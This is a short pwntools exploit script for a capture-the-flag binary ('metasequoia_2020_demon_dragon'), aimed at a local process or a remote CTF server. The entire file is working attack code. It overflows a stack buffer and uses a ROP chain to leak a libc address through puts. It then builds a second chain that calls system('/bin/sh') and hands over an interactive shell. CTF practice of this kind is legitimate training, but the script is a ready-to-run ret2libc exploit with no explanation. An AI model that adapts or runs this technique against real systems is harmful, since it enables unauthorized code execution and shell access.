import sys
from pwn import *
from ctypes import *
context.log_level='debug'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./metasequoia_2020_demon_dragon')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./metasequoia_2020_demon_dragon')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			io=remote('node3.buuoj.cn',27739)
			elf=ELF('./metasequoia_2020_demon_dragon')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]



		io.recv()
		pay='a'*0x48+p64(0x0000000000400c3a)+p64(elf.got['puts'])+p64(0)*2+p64(elf.plt['puts'])+p64(0x0000000000400D6E)*3
		# gdb.attach(io)
		# pause()
		io.sendline(pay)
		libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['puts']
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		io.recv()
		pay='a'*0x48+p64(0x0000000000400c3a)+p64(bin_sh_addr)+p64(0)*2+p64(system_addr)+p64(0x0000000000400D6E)*3
		io.sendline(pay)
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue